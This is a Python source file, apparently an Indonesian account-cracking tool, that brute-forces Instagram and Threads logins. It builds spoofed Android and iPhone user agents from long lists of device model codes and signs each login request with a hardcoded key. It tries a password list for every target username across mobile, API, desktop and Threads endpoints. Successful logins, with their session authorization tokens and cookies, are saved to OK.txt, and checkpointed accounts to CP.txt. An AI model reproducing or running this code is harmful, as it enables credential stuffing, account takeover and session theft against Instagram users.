'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A']
    vivo2 = ["vivo/iQOO 5 Pro", "vivo/iQOO 7", "vivo/iQOO Z5", "vivo/iQOO U3", "vivo/iQOO U1x", "vivo/iQOO Neo 3", "vivo/iQOO U1", "vivo/iQOO 8", "vivo/iQOO 9", "vivo/iQOO Z3", "vivo/iQOO Z6", "vivo/iQOO Z7", "vivo/iQOO U5", "vivo/iQOO U3x", "vivo/iQOO 6", "vivo/iQOO 10", "vivo/iQOO Z1", "vivo/iQOO 11", "vivo/iQOO Z2", "vivo/iQOO 12", "vivo/iQOO Z4", "vivo/iQOO 13", "vivo/iQOO Z8", "vivo/iQOO 14", "vivo/iQOO Z9", "vivo/iQOO 15", "vivo/iQOO Z10", "vivo/iQOO 16", "vivo/iQOO Z11", "vivo/iQOO 17", "vivo/iQOO Z12"]
    poco = ['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G']
    return random.choice([
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; asus; {str(random.choice(asus))}; {str(random.choice(asus))}; qcom; in_ID; {kode})',
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; oppo; {str(random.choice(oppo))}; {str(random.choice(oppo2))}; qcom; in_ID; {kode})',
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; micromax; {str(random.choice(micromax))}; {str(random.choice(micromax))}; qcom; in_ID; {kode})',
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; oneplus; {str(random.choice(oneplus))}; {str(random.choice(oneplus))}; qcom; in_ID; {kode})',
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; vivo; {str(random.choice(vivo2))}; {str(random.choice(vivo))}; qcom; in_ID; {kode})',
        f'Barcelona {versi_istagram} Android ({device_android}; {dpi}; {pxl}; poco; {str(random.choice(poco))}; {str(random.choice(poco))}; qcom; in_ID; {kode})',
        f"Barcelona {versi_istagram} (iPhone{iphn}; {ios}; in_ID; in_ID; scale={scale}; gamut={gamut}; {pxl}; {kode})"  
    ])
    

 
def i_insta(username, password):
    global hitung,success,checkpoint, login
    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY MOBILE WEB {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
    iniapabree.advance(kaloinijugaapa)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'i.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'Connection': 'Close',
                 'User-Agent': fanuaig(),
                 'X-IG-Capabilities': 'Fw==',
                 'X-IG-App-ID': '936619743392459',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2;ig_nrcb=1'
            }
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('set-cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
                 tree.add(f"{H2}{username} | {pw}{P2}")
                 tree.add(f"{H2}{followers} | {following}{P2}")
                 tree.add(f"{U2}{header['User-Agent']}{P2}")
                 tree.add(f"{U2}{auth}{P2}\n")
                 prints(tree)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
                 tree.add(f"{K2}{username} | {pw}{P2}")
                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
                 prints(tree)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s\n'%(username,pw))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def api_insta(username, password):
    global hitung,success,checkpoint, login
    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY API {H2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
    iniapabree.advance(kaloinijugaapa)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://api.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken',''),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'from_reg': 'false',
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'api.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                 'Accept': '*/*',
                 'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                 'X-IG-App-ID': '936619743392459',
                 'Accept-Encoding': 'br, gzip, deflate',
                 'Accept-Language': 'id-ID',
                 'X-IG-ABR-Connection-Speed-KBPS': '0',
                 'User-Agent': fanuaig(),
                 'Connection': 'keep-alive',
                 'X-IG-Capabilities': '36r/dw==',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'
            }
            response = ses.post('https://api.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
                 tree.add(f"{H2}{username} | {pw}{P2}")
                 tree.add(f"{H2}{followers} | {following}{P2}")
                 tree.add(f"{U2}{header['User-Agent']}{P2}")
                 tree.add(f"{U2}{auth}{P2}\n")
                 prints(tree)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
                 tree.add(f"{K2}{username} | {pw}{P2}", style=f"{color_panel}")
                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
                 prints(tree)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s'%(username,pw,followers, following))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def www_insta(username, password):
    global hitung,success,checkpoint, login
    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY DESKTOP WEB {H2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
    iniapabree.advance(kaloinijugaapa)
    for pw in password:
        try:
            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'api.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                 'Accept': '*/*',
                 'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                 'X-IG-App-ID': '936619743392459',
                 'Accept-Language': 'id-ID',
                 'X-IG-ABR-Connection-Speed-KBPS': '0',
                 'User-Agent': fanuaig(),
                 'Connection': 'keep-alive',
                 'X-IG-Capabilities': '36r/dw==',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'
            }
            response = ses.post('https://www.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
                 tree.add(f"{H2}{username} | {pw}{P2}")
                 tree.add(f"{H2}{followers} | {following}{P2}")
                 tree.add(f"{U2}{header['User-Agent']}{P2}")
                 tree.add(f"{U2}{auth}{P2}\n")
                 prints(tree)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
                 tree.add(f"{K2}{username} | {pw}{P2}", style=f"{color_panel}")
                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
                 prints(tree)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s\n'%(username,pw,followers, following))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1

def threads(username, password):
    global hitung,success,checkpoint, login
    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY THREADS {H2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
    iniapabree.advance(kaloinijugaapa)
    for pw in password:
        try:
            session = requests.Session()
            session.headers.update({'host': 'b.i.instagram.com', 'x-ig-app-locale': 'in_ID', 'x-ig-device-locale': 'in_ID', 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3', 'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()), 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-bandwidth-totaltime-ms': '0', 'x-bloks-version-id': self.Blok_ID(), 'x-ig-www-claim': '0', 'x-bloks-is-prism-enabled': 'false', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d', 'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357', 'x-ig-android-id': 'android-f4d8eb2bd1b86a47', 'x-ig-timezone-offset': str(self.timezone_offset()), 'x-fb-connection-type': self.UseNet()[0], 'x-ig-connection-type': self.UseNet()[1], 'x-ig-capabilities': '3brTv10=', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)', 'accept-language': 'id-ID, en-US', 'x-mid': str(self.SetMid()), 'ig-intended-user-id': '0', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'content-length': '2702', 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True'})
            session.headers.update({**HeadersApiLogin(),
            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
            'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
            'x-ig-device-id': str(uuid.uuid4()),
            'x-ig-family-device-id': str(uuid.uuid4()),
            'x-ig-android-id': 'android-%s'%(Android_ID(users,pwb).hexdigest()[:16]),
            'x-ig-timezone-offset': str(timezone_offset()),
            'x-ig-app-id': '3419628305025917',
            'user-agent': AppUac(HeadersApiLogin()['x-bloks-version-id']),
            # HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
            })

            request = login['Lib']
            if requests == 'req':ses=requests.Session()
            else:ses=httpx
            curl    = ses.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'password': pw,
                 'login_attempt_count': '0',
               }
            )
            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            encod  = f'ig_sig_key_version=4&signed_body={param}'
            header = {
                 'Authority': 'api.instagram.com',
                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-IG-Connection-Speed': f'{random.randint(100,999)}kbps',
                 'Accept': '*/*',
                 'X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),
                 'X-IG-App-ID': '936619743392459',
                 'Accept-Language': 'id-ID',
                 'X-IG-ABR-Connection-Speed-KBPS': '0',
                 'User-Agent': UserAgent(),
                 'Connection': 'keep-alive',
                 'X-IG-Capabilities': '36r/dw==',
                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2'
            }
            response = ses.post('https://www.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
                 tree.add(f"{H2}{username} | {pw}{P2}")
                 tree.add(f"{H2}{followers} | {following}{P2}")
                 tree.add(f"{U2}{header['User-Agent']}{P2}")
                 tree.add(f"{U2}{auth}{P2}\n")
                 prints(tree)
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
            elif 'https://i.instagram.com/challenge/' in str(response.text):
                 checkpoint +=1
                 followers, following = info(username)
                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
                 tree.add(f"{K2}{username} | {pw}{P2}", style=f"{color_panel}")
                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
                 prints(tree)
                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s\n'%(username,pw,followers, following))
                 sv.close()
                 break
        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
    hitung +=1




if __name__ == '__main__':
	try:os.mkdir('data')
	except:pass
	try:os.system("git pull")
	except:pass
	ceklogin()













